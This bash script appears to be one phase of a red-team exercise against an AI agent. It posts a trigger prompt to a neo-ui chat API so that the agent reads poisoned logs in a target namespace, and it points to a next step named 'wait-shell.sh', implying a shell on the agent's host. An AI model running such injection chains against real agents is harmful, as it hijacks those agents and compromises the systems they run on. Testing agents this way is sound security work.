#!/usr/bin/env bash
# Send trigger prompt to the agent via neo-ui /api/chat.
# The trigger makes the agent read poisoned logs in target-apps namespace.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: trigger.sh"
  echo "  Sends the trigger prompt to neo-ui, causing the agent to read poisoned logs."
  echo ""
  echo "Environment:"
  echo "  NEO_UI_SVC   neo-ui service address (default: neo-ui.\$AGENT_NS.svc:3458)"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Phase 1: Trigger Agent"

AGENT_IP=$(resolve_agent_ip)
echo "  Agent IP: $AGENT_IP"
echo "  Target:   http://${NEO_UI_SVC}/api/chat"
echo ""

TRIGGER_PROMPT=$(resolve_prompt "trigger")

echo "── Sending trigger prompt ──"
RESP=$(post_prompt "$TRIGGER_PROMPT")
HTTP_CODE=$(echo "$RESP" | tail -1)
echo "  Response: HTTP $HTTP_CODE"

if [[ "$HTTP_CODE" != "202" ]]; then
  echo "WARNING: Expected 202, got $HTTP_CODE. Agent might be busy."
fi

echo ""
echo "Trigger sent. The agent will now read poisoned logs."
echo "Next: wait-shell.sh"
